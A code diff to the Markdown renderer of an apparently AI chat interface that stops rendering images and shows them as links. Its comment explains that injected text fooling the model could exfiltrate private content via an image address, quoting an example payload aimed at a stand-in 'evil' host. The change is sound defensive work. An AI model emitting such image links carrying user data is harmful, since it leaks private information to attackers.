@@ -14,6 +14,15 @@ function textOf(node: unknown): string {
   return '';
 }
 
+/** The host of an address for display ("cdn.example.com"); the address itself when it cannot be parsed. */
+function hostOf(href: string): string {
+  try {
+    return new URL(href).host || href;
+  } catch {
+    return href;
+  }
+}
+
 function CodeBlock({ children }: { children?: unknown }) {
   const t = useT();
   return (
@@ -52,6 +61,19 @@ export const Markdown = memo(function Markdown({ text, streaming }: { text: stri
           h4: ({ node: _n, ...p }) => <h4 dir="auto" {...p} />,
           blockquote: ({ node: _n, ...p }) => <blockquote dir="auto" {...p} />,
           a: ({ node: _n, href, ...p }) => <a href={href} target="_blank" rel="noopener noreferrer" {...p} />,
+          // An image in an answer would make the browser request its address the moment the answer is shown, so text from a chat,
+          // file or web page that fools the model could carry private content out in that address (`![](https://evil/?q=…)`).
+          // Never render <img>: show a link instead (the alt text, or the host when there is none), which loads nothing until the
+          // user chooses to open it.
+          img: ({ node: _n, src, alt }) => {
+            const href = typeof src === 'string' ? src : '';
+            if (!href) return <>{alt ?? ''}</>;
+            return (
+              <a href={href} target="_blank" rel="noopener noreferrer" className="md-image-link">
+                {alt?.trim() || hostOf(href)}
+              </a>
+            );
+          },
           pre: ({ node: _n, children }) => <CodeBlock>{children}</CodeBlock>,
           table: ({ node: _n, ...p }) => (
             <div className="table-wrap">
